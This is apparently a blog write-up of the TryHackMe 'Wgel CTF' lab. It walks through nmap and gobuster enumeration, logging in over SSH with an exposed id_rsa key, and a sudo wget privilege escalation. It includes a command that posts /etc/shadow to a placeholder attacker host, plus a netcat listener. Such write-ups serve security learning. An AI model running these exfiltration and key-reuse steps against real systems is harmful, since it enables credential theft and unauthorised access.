---
title: "Challenges: wgelctf (TryHackMe)"
datePublished: Thu Jul 10 2025 20:36:19 GMT+0000 (Coordinated Universal Time)
cuid: cmcxulmba000102jv6byre8ht
slug: challenges-wgelctf-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1752179720955/b9996029-391b-4b10-8097-cb7b0d2ddb6c.png
tags: tryhackme, wget, gobuster, ctf-writeup, privilege-escalation

---

## Wgel CTF

Start Machine

Have fun with this easy box.

### Answer the questions below

1. User flag  
      
    `nmap -sC -sV IP_Address`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752178764112/e4580679-0ab9-4351-bba7-124dbb807643.png align="center")
    
    on the source code of http://IP\_ADDRESS there’s comment with name `jessie`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752178813561/b4837961-0be5-445a-b616-56fb42e87467.png align="center")
    
    just look around the site and enumerating we find the `/sitemap/` path that has this interesting `.ssh` folder and several paths that didn’t have much helpful info  
      
    `gobuster dir -u http://IP_Address/sitemap/ -w /usr/share/wordlists/dirb/common.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752178943081/bfe0db1e-bc5b-4bf6-93a4-cf2827ceaab9.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752179003799/23459567-d90b-4eab-99ee-61dcf1ff3b80.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752179026773/1103d474-a7c7-48b0-866f-49b1ef0a2ebe.png align="center")
    
    we copied the id\_rsa into a file and set permissions. Then used id\_rsa to low access, jessie, for the user flag  
      
    `ssh -i id_rsa jessie@<TARGET_IP>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752179063250/a25f83f5-3dc9-4e9b-9ab4-d62c351e083e.png align="center")
    
    `ls`  
      
    `ls -la /Documents`  
      
    `cat /Documents/user_flag.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752179208614/2bd9bb14-20d8-4465-90c3-06c9bc3ba0b0.png align="center")
    
2. Root flag  
      
    after running `sudo -l` my first thought was to check sudo under wget on [GTFOBINS](https://gtfobins.github.io/gtfobins/wget/#sudo) but it was a bit complicated later on learned of a different way through this [article](https://medium.com/@9cesec/wgel-ctf-tryhackme-d19228a1b966) and GPT.
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752179237030/07753743-d4f4-4c1d-8117-597afa700f4e.png align="center")
    
    `sudo wget —post-file=/etc/shadow http://ATT_IP:443`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752179473769/ca6dbd0f-7db1-4b77-bd92-69b9cdea445e.png align="center")
    
    `nc -lvnp 8000`  
      
    `ls`  
      
    `cat root_flag.txt`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752179491889/2cfdb5db-aa1a-4bdb-adc9-b05b765dd727.png align="center")